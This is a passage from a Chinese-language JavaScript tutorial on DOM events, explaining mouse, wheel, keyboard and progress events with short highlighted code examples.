<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;div id=&quot;outer&quot; style=&quot;height:50px;width:50px;border-width:1px solid black;&quot;&gt;</span></span><br><span class="line"><span class="comment">    &lt;div id=&quot;inner&quot; style=&quot;height:25px;width:25px;border:1px solid black;&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment">  &lt;/div&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> inner = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;inner&#x27;</span>);</span><br><span class="line">inner.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseover&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;进入&#x27;</span> + event.<span class="property">target</span>.<span class="property">id</span> + <span class="string">&#x27; 离开&#x27;</span> + event.<span class="property">relatedTarget</span>.<span class="property">id</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">inner.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;进入&#x27;</span> + event.<span class="property">target</span>.<span class="property">id</span> + <span class="string">&#x27; 离开&#x27;</span> + event.<span class="property">relatedTarget</span>.<span class="property">id</span>);</span><br><span class="line">&#125;);</span><br><span class="line">inner.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseout&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;离开&#x27;</span> + event.<span class="property">target</span>.<span class="property">id</span> + <span class="string">&#x27; 进入&#x27;</span> + event.<span class="property">relatedTarget</span>.<span class="property">id</span>);</span><br><span class="line">&#125;);</span><br><span class="line">inner.<span class="title function_">addEventListener</span>(<span class="string">&quot;mouseleave&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;离开&#x27;</span> + event.<span class="property">target</span>.<span class="property">id</span> + <span class="string">&#x27; 进入&#x27;</span> + event.<span class="property">relatedTarget</span>.<span class="property">id</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标从 outer 进入inner，输出</span></span><br><span class="line"><span class="comment">// 进入inner 离开outer</span></span><br><span class="line"><span class="comment">// 进入inner 离开outer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标从 inner进入 outer，输出</span></span><br><span class="line"><span class="comment">// 离开inner 进入outer</span></span><br><span class="line"><span class="comment">// 离开inner 进入outer</span></span><br></pre></td></tr></table></figure>



<h3 id="4、MouseEvent-接口的实例方法"><a href="#4、MouseEvent-接口的实例方法" class="headerlink" title="4、MouseEvent 接口的实例方法"></a>4、MouseEvent 接口的实例方法</h3><h4 id="4-1-MouseEvent-getModifierState-是否按下指定功能键"><a href="#4-1-MouseEvent-getModifierState-是否按下指定功能键" class="headerlink" title="4.1 MouseEvent.getModifierState() 是否按下指定功能键"></a>4.1 MouseEvent.getModifierState() 是否按下指定功能键</h4><p><code>MouseEvent.getModifierState</code>方法<strong>返回一个布尔值，表示有没有按下特定的功能键。它的参数是一个表示<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/getModifierState#Modifier_keys_on_Gecko">功能键</a>的字符串。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="title function_">getModifierState</span>(<span class="string">&#x27;CapsLock&#x27;</span>));</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面的代码可以了解用户是否按下了大写键。</p>
<h3 id="5、WheelEvent-接口-（滚轮）"><a href="#5、WheelEvent-接口-（滚轮）" class="headerlink" title="5、WheelEvent 接口 （滚轮）"></a>5、WheelEvent 接口 （滚轮）</h3><h4 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="5.1 概述"></a>5.1 概述</h4><p><strong>WheelEvent 接口继承了 MouseEvent 实例，代表鼠标滚轮事件的实例对象</strong>。目前，鼠标滚轮相关的事件只有一个<code>wheel</code>事件，用户滚动鼠标的滚轮，就生成这个事件的实例。</p>
<p>浏览器原生提供<code>WheelEvent()</code>构造函数，用来生成<code>WheelEvent</code>实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wheelEvent = <span class="keyword">new</span> <span class="title class_">WheelEvent</span>(type, options);</span><br></pre></td></tr></table></figure>

<p><code>WheelEvent()</code>构造函数可以接受两个参数，第一个是字符串，表示事件类型，对于滚轮事件来说，这个值目前只能是<code>wheel</code>。第二个参数是事件的配置对象。该对象的属性除了<code>Event</code>、<code>UIEvent</code>的配置属性以外，还可以接受以下几个属性，所有属性都是可选的。</p>
<ul>
<li><code>deltaX</code>：数值，表示滚轮的水平滚动量，默认值是 0.0。</li>
<li><code>deltaY</code>：数值，表示滚轮的垂直滚动量，默认值是 0.0。</li>
<li><code>deltaZ</code>：数值，表示滚轮的 Z 轴滚动量，默认值是 0.0。</li>
<li><code>deltaMode</code>：数值，表示相关的滚动事件的单位，适用于上面三个属性。<code>0</code>表示滚动单位为像素，<code>1</code>表示单位为行，<code>2</code>表示单位为页，默认为<code>0</code>。</li>
</ul>
<h4 id="5-2-实例属性"><a href="#5-2-实例属性" class="headerlink" title="5.2 实例属性"></a>5.2 实例属性</h4><p><code>WheelEvent</code>事件实例除了具有<code>Event</code>和<code>MouseEvent</code>的实例属性和实例方法，还有一些自己的实例属性，但是没有自己的实例方法。</p>
<p>下面的属性都是只读属性。</p>
<ul>
<li><code>WheelEvent.deltaX</code>：数值，表示滚轮的水平滚动量。</li>
<li><code>WheelEvent.deltaY</code>：数值，表示滚轮的垂直滚动量。</li>
<li><code>WheelEvent.deltaZ</code>：数值，表示滚轮的 Z 轴滚动量。</li>
<li><code>WheelEvent.deltaMode</code>：数值，表示上面三个属性的单位，<code>0</code>是像素，<code>1</code>是行，<code>2</code>是页。</li>
</ul>
<h2 id="五、键盘事件"><a href="#五、键盘事件" class="headerlink" title="五、键盘事件"></a>五、键盘事件</h2><h3 id="1、键盘事件的种类"><a href="#1、键盘事件的种类" class="headerlink" title="1、键盘事件的种类"></a>1、键盘事件的种类</h3><p>键盘事件由用户击打键盘触发，主要有<code>keydown</code>、<code>keypress</code>、<code>keyup</code>三个事件，它们都继承了<code>KeyboardEvent</code>接口。</p>
<ul>
<li><code>keydown</code>：按下键盘时触发。<strong>【按下】</strong></li>
<li><code>keypress</code>：按下有值的键时触发，即按下 Ctrl、Alt、Shift、Meta 这样无值的键，这个事件不会触发。对于有值的键，按下时先触发<code>keydown</code>事件，再触发这个事件。<strong>【按下有值的键】</strong></li>
<li><code>keyup</code>：松开键盘时触发该事件。<strong>【松开】</strong></li>
</ul>
<p>如果用户一直按键不松开，就会连续触发键盘事件，触发的顺序如下。</p>
<ol>
<li>keydown</li>
<li>keypress</li>
<li>keydown</li>
<li>keypress</li>
<li>…（重复以上过程）</li>
<li>keyup</li>
</ol>
<h3 id="2、KeyboardEvent-接口概述"><a href="#2、KeyboardEvent-接口概述" class="headerlink" title="2、KeyboardEvent 接口概述"></a>2、KeyboardEvent 接口概述</h3><p><code>KeyboardEvent</code>接口用来描述用户与键盘的互动。这个接口<strong>继承了<code>Event</code>接口</strong>，并且定义了自己的实例属性和实例方法。</p>
<p>浏览器原生提供<code>KeyboardEvent</code>构造函数，用来新建键盘事件的实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">KeyboardEvent</span>(type, options) <span class="comment">// 参数一，事件类型；参数二，事件配置对象</span></span><br></pre></td></tr></table></figure>

<p><code>KeyboardEvent</code>构造函数接受两个参数。第一个参数是字符串，表示<strong>事件类型</strong>；第二个参数是一个<strong>事件配置对象</strong>，该参数可选。除了<code>Event</code>接口提供的属性，还可以配置以下字段，它们都是可选。</p>
<ul>
<li><code>key</code>：字符串，当前按下的键，默认为空字符串。<strong>【键名】</strong></li>
<li><code>code</code>：字符串，表示当前按下的键的字符串形式，默认为空字符串。<strong>【键码】</strong></li>
<li><code>location</code>：整数，当前按下的键的位置，默认为<code>0</code>。</li>
<li><code>ctrlKey</code>：布尔值，是否按下 Ctrl 键，默认为<code>false</code>。</li>
<li><code>shiftKey</code>：布尔值，是否按下 Shift 键，默认为<code>false</code>。</li>
<li><code>altKey</code>：布尔值，是否按下 Alt 键，默认为<code>false</code>。</li>
<li><code>metaKey</code>：布尔值，是否按下 Meta 键，默认为<code>false</code>。</li>
<li><code>repeat</code>：布尔值，是否重复按键，默认为<code>false</code>。</li>
</ul>
<h3 id="3、KeyboardEvent-的实例属性"><a href="#3、KeyboardEvent-的实例属性" class="headerlink" title="3、KeyboardEvent 的实例属性"></a>3、KeyboardEvent 的实例属性</h3><h4 id="3-1-KeyboardEvent-altKey，KeyboardEvent-ctrlKey，KeyboardEvent-metaKey，KeyboardEvent-shiftKey-【是否按下对应键，布尔值】"><a href="#3-1-KeyboardEvent-altKey，KeyboardEvent-ctrlKey，KeyboardEvent-metaKey，KeyboardEvent-shiftKey-【是否按下对应键，布尔值】" class="headerlink" title="3.1 KeyboardEvent.altKey，KeyboardEvent.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey 【是否按下对应键，布尔值】"></a>3.1 KeyboardEvent.altKey，KeyboardEvent.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey 【是否按下对应键，布尔值】</h4><p>以下属性都是<strong>只读</strong>属性，返回一个布尔值，表示是否按下对应的键。</p>
<ul>
<li><code>KeyboardEvent.altKey</code>：是否按下 Alt 键</li>
<li><code>KeyboardEvent.ctrlKey</code>：是否按下 Ctrl 键</li>
<li><code>KeyboardEvent.metaKey</code>：是否按下 meta 键（Mac 系统是一个四瓣的小花，Windows 系统是 windows 键）</li>
<li><code>KeyboardEvent.shiftKey</code>：是否按下 Shift 键</li>
</ul>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showChar</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ALT: &#x27;</span> + e.<span class="property">altKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;CTRL: &#x27;</span> + e.<span class="property">ctrlKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Meta: &#x27;</span> + e.<span class="property">metaKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Shift: &#x27;</span> + e.<span class="property">shiftKey</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, showChar, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>



<h4 id="3-2-KeyboardEvent-code-键码"><a href="#3-2-KeyboardEvent-code-键码" class="headerlink" title="3.2 KeyboardEvent.code 键码"></a>3.2 KeyboardEvent.code 键码</h4><p><code>KeyboardEvent.code</code>属性<strong>返回一个字符串，表示当前按下的键的字符串形式</strong>。该属性<strong>只读</strong>。</p>
<p>下面是一些常用键的字符串形式，其他键请查<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/code#Code_values">文档</a>。</p>
<ul>
<li>数字键0 - 9：返回<code>digital0</code> - <code>digital9</code></li>
<li>字母键A - z：返回<code>KeyA</code> - <code>KeyZ</code></li>
<li>功能键F1 - F12：返回 <code>F1</code> - <code>F12</code></li>
<li>方向键：返回<code>ArrowDown</code>、<code>ArrowUp</code>、<code>ArrowLeft</code>、<code>ArrowRight</code></li>
<li>Alt 键：返回<code>AltLeft</code>或<code>AltRight</code></li>
<li>Shift 键：返回<code>ShiftLeft</code>或<code>ShiftRight</code></li>
<li>Ctrl 键：返回<code>ControlLeft</code>或<code>ControlRight</code></li>
</ul>
<h4 id="3-3-KeyboardEvent-key-键名"><a href="#3-3-KeyboardEvent-key-键名" class="headerlink" title="3.3 KeyboardEvent.key 键名"></a>3.3 KeyboardEvent.key 键名</h4><p><code>KeyboardEvent.key</code>属性<strong>返回一个字符串，表示按下的键名</strong>。该属性<strong>只读</strong>。</p>
<p>如果按下的键代表可打印字符，则返回这个字符，比如数字、字母。</p>
<p>如果按下的键代表不可打印的特殊字符，则返回预定义的键值，比如 Backspace，Tab，Enter，Shift，Control，Alt，CapsLock，Esc，Spacebar，PageUp，PageDown，End，Home，Left，Right，Up，Down，PrintScreen，Insert，Del，Win，F1～F12，NumLock，Scroll 等。</p>
<p>如果同时按下一个控制键和一个符号键，则返回符号键的键名。比如，按下 Ctrl + a，则返回<code>a</code>；按下 Shift + a，则返回大写的<code>A</code>。</p>
<p>如果无法识别键名，返回字符串<code>Unidentified</code>。</p>
<h4 id="3-4-KeyboardEvent-location-键处于哪个位置，整数"><a href="#3-4-KeyboardEvent-location-键处于哪个位置，整数" class="headerlink" title="3.4 KeyboardEvent.location 键处于哪个位置，整数"></a>3.4 KeyboardEvent.location 键处于哪个位置，整数</h4><p><code>KeyboardEvent.location</code>属性<strong>返回一个整数，表示按下的键处在键盘的哪一个区域</strong>。它可能取以下值。</p>
<ul>
<li><p>0：处在键盘的主区域，或者无法判断处于哪一个区域。</p>
</li>
<li><p>1：处在键盘的左侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。</p>
</li>
<li><p>2：处在键盘的右侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。</p>
</li>
<li><p>3：处在数字小键盘。</p>
</li>
</ul>
<h4 id="3-5-KeyboardEvent-repeat-是否长按"><a href="#3-5-KeyboardEvent-repeat-是否长按" class="headerlink" title="3.5 KeyboardEvent.repeat 是否长按"></a>3.5 KeyboardEvent.repeat 是否长按</h4><p><code>KeyboardEvent.repeat</code>返回一个<strong>布尔值，代表该键是否被按着不放</strong>，以便判断是否重复这个键，即浏览器会持续触发<code>keydown</code>和<code>keypress</code>事件，直到用户松开手为止。</p>
<h3 id="4、KeyboardEvent-的实例方法"><a href="#4、KeyboardEvent-的实例方法" class="headerlink" title="4、KeyboardEvent 的实例方法"></a>4、KeyboardEvent 的实例方法</h3><h4 id="4-1-KeyboardEvent-getModifierState-是否按下指定功能键"><a href="#4-1-KeyboardEvent-getModifierState-是否按下指定功能键" class="headerlink" title="4.1 KeyboardEvent.getModifierState() 是否按下指定功能键"></a>4.1 KeyboardEvent.getModifierState() 是否按下指定功能键</h4><p><code>KeyboardEvent.getModifierState()</code>方法返回一个<strong>布尔值，表示是否按下或激活指定的功能键</strong>。它的常用参数如下。</p>
<ul>
<li><code>Alt</code>：Alt 键</li>
<li><code>CapsLock</code>：大写锁定键</li>
<li><code>Control</code>：Ctrl 键</li>
<li><code>Meta</code>：Meta 键</li>
<li><code>NumLock</code>：数字键盘开关键</li>
<li><code>Shift</code>：Shift 键</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">  event.<span class="title function_">getModifierState</span>(<span class="string">&#x27;Control&#x27;</span>) +</span><br><span class="line">  event.<span class="title function_">getModifierState</span>(<span class="string">&#x27;Alt&#x27;</span>) +</span><br><span class="line">  event.<span class="title function_">getModifierState</span>(<span class="string">&#x27;Meta&#x27;</span>) &gt; <span class="number">1</span></span><br><span class="line">) &#123;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码表示，只要<code>Control</code>、<code>Alt</code>、<code>Meta</code>里面，同时按下任意两个或两个以上的键就返回。</p>
<h2 id="六、进度事件"><a href="#六、进度事件" class="headerlink" title="六、进度事件"></a>六、进度事件</h2><h3 id="1、进度事件的种类"><a href="#1、进度事件的种类" class="headerlink" title="1、进度事件的种类"></a>1、进度事件的种类</h3><p><strong>进度事件用来描述资源加载的进度</strong>，主要由 AJAX 请求、<code> &lt;img&gt; </code>、<code> &lt;audio&gt; </code>、<code> &lt;video&gt; </code>、<code> &lt;style&gt; </code>、<code>&lt;link&gt;</code>等外部资源的加载触发，继承了<code>ProgressEvent</code>接口。它主要包含以下几种<strong>事件</strong>。</p>
<ul>
<li><code>abort</code>：外部资源中止加载时（比如用户取消）触发。如果发生错误导致中止，不会触发该事件。<strong>【中止加载】</strong></li>
<li><code>error</code>：由于错误导致外部资源无法加载时触发。<strong>【加载错误】</strong></li>
<li><code>load</code>：外部资源加载成功时触发。<strong>【加载成功】</strong></li>
<li><code>loadstart</code>：外部资源开始加载时触发。<strong>【开始加载】</strong></li>
<li><code>loadend</code>：外部资源停止加载时触发，发生顺序排在<code>error</code>、<code>abort</code>、<code>load</code>等事件的后面。<strong>【停止加载】</strong></li>
<li><code>progress</code>：外部资源加载过程中不断触发。<strong>【加载中，不断触发】</strong></li>
<li><code>timeout</code>：加载超时时触发。<strong>【加载超时】</strong></li>
</ul>
<p>注意，除了资源下载，<strong>文件上传也存在这些事件</strong>。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">image.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123; <span class="comment">// 加载成功</span></span><br><span class="line">  image.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;finished&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">image.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123; <span class="comment">// 加载出错</span></span><br><span class="line">  image.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码在图片元素加载完成后，为图片元素添加一个<code>finished</code>的 Class。如果加载失败，就把图片元素的样式设置为不显示。</p>
<p>有时候，图片加载会在脚本运行之前就完成，尤其是当脚本放置在网页底部的时候，因此有可能<code>load</code>和<code>error</code>事件的监听函数根本不会执行。所以，比较可靠的方式，是用<code>complete</code>属性先判断一下是否加载完成。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loaded</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (image.<span class="property">complete</span>) &#123; <span class="comment">// 是否加载完成</span></span><br><span class="line">  <span class="title function_">loaded</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  image.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, loaded); <span class="comment">// 加载成功事件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 DOM 的元素节点没有提供是否加载错误的属性，所以<code>error</code>事件的监听函数最好放在<code> &lt;img&gt; </code>元素的 HTML 代码中，这样才能保证发生加载错误时百分之百会执行。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/wrong/url&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;this.style.display=&#x27;none&#x27;;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>loadend</code>事件的监听函数，可以用来取代<code>abort</code>事件、<code>load</code>事件、<code>error</code>事件的监听函数，因为它总是在这些事件之后发生。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">req.<span class="title function_">addEventListener</span>(<span class="string">&#x27;loadend&#x27;</span>, loadEnd, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadEnd</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;传输结束，成功失败未知&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>loadend</code>事件本身不提供关于进度结束的原因，但可以用它来做所有加载结束场景都需要做的一些操作。</p>
<p>另外，<code>error</code>事件有一个特殊的性质，就是不会冒泡。所以，子元素的<code>error</code>事件，不会触发父元素的<code>error</code>事件监听函数。</p>
<h3 id="2、ProgressEvent-接口"><a href="#2、ProgressEvent-接口" class="headerlink" title="2、ProgressEvent 接口"></a>2、ProgressEvent 接口</h3><h4 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h4><p><code>ProgressEvent</code>接口主要用来描述外部资源加载的进度，比如 AJAX 加载、<code> &lt;img&gt; </code>、<code> &lt;video&gt; </code>、<code> &lt;style&gt; </code>、<code>&lt;link&gt;</code>等外部资源加载。进度相关的事件都继承了这个接口。<strong>这个接口继承了Event接口。</strong></p>
<p>浏览器原生提供了<code>ProgressEvent()</code>构造函数，用来生成事件实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ProgressEvent</span>(type, options) <span class="comment">// 参数一，事件类型；参数二，配置对象</span></span><br></pre></td></tr></table></figure>

<p><code>ProgressEvent()</code>构造函数接受两个参数。第一个参数是字符串，表示事件的类型，这个参数是必须的。第二个参数是一个配置对象，表示事件的属性，该参数可选。配置对象除了可以使用<code>Event</code>接口的配置属性，还可以使用下面的属性，所有这些属性都是可选的。</p>
<ul>
<li><code>lengthComputable</code>：布尔值，表示加载的<strong>总量是否可以计算</strong>，默认是<code>false</code>。</li>
<li><code>loaded</code>：整数，表示<strong>已经加载的量</strong>，默认是<code>0</code>。</li>
<li><code>total</code>：整数，表示<strong>需要加载的总量</strong>，默认是<code>0</code>。</li>
</ul>
<h4 id="2-2-ProgressEvent的实例属性。"><a href="#2-2-ProgressEvent的实例属性。" class="headerlink" title="2.2 ProgressEvent的实例属性。"></a>2.2 ProgressEvent的实例属性。</h4><ul>
<li><code>ProgressEvent.lengthComputable</code> <strong>总量是否可以计算</strong></li>
<li><code>ProgressEvent.loaded</code> <strong>已加载的量</strong></li>
<li><code>ProgressEvent.total </code> <strong>需要加载的总量</strong></li>
</ul>
<p>如果<code>ProgressEvent.lengthComputable</code>为<code>false</code>，<code>ProgressEvent.total</code>实际上是没有意义的。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">ProgressEvent</span>(<span class="string">&#x27;load&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">lengthComputable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">loaded</span>: <span class="number">30</span>,</span><br><span class="line">  <span class="attr">total</span>: <span class="number">100</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;已经加载：&#x27;</span> + (e.<span class="property">loaded</span> / e.<span class="property">total</span>) * <span class="number">100</span> + <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">dispatchEvent</span>(p);</span><br><span class="line"><span class="comment">// 已经加载：30%</span></span><br></pre></td></tr></table></figure>

<p>上面代码先构造一个<code>load</code>事件，抛出后被监听函数捕捉到。</p>
<p>下面是一个实际的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;progress&#x27;</span>, updateProgress, <span class="literal">false</span>); <span class="comment">// 加载中</span></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, transferComplete, <span class="literal">false</span>); <span class="comment">// 加载成功</span></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, transferFailed, <span class="literal">false</span>); <span class="comment">// 加载错误</span></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;abort&#x27;</span>, transferCanceled, <span class="literal">false</span>); <span class="comment">// 中止加载</span></span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateProgress</span>(<span class="params">e</span>) &#123; <span class="comment">// 加载中</span></span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">lengthComputable</span>) &#123; <span class="comment">// 是否可以计算总量</span></span><br><span class="line">    <span class="keyword">var</span> percentComplete = e.<span class="property">loaded</span> / e.<span class="property">total</span>; <span class="comment">// 加载进度计算</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;不能计算进度&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transferComplete</span>(<span class="params">e</span>) &#123; <span class="comment">// 加载成功</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;传输结束&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transferFailed</span>(<span class="params">evt</span>) &#123; <span class="comment">// 加载错误</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;传输过程中发生错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transferCanceled</span>(<span class="params">evt</span>) &#123; <span class="comment">// 中止加载</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title 